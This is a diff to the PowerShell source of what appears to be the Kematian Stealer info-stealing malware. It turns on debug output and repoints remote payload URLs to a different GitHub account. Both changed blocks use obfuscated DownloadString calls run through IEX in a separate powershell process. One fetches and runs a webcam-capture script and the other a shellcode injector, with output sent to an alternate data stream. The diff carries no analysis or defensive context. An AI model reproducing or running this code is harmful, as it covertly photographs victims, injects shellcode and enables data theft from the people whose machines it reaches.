@@ -1,4 +1,4 @@
-$debug = $false
+$debug = $true
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -787,12 +787,13 @@ function Backup-Data {
     #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
 
     # Fix webcam hang with unsupported devices
-
-    $webcam = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
+	
+    Write-Host "[!] Capturing an image with Webcam !"
+    $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
     $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput ($PSCommandPath + ":stdout")
     $invokewebcam.WaitForExit()
- 
+    Write-Host "[!] Webcam captured !" -ForegroundColor Green
 
     $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
     foreach ($item in $items) {
@@ -896,7 +897,7 @@ function Backup-Data {
     
     Write-Host "`r `n"
     Write-Host "[!] Injecting Shellcode !"
-    $kematian_shellcode = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+    $kematian_shellcode = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput ($PSCommandPath + ":stdout")
     $proc.WaitForExit()
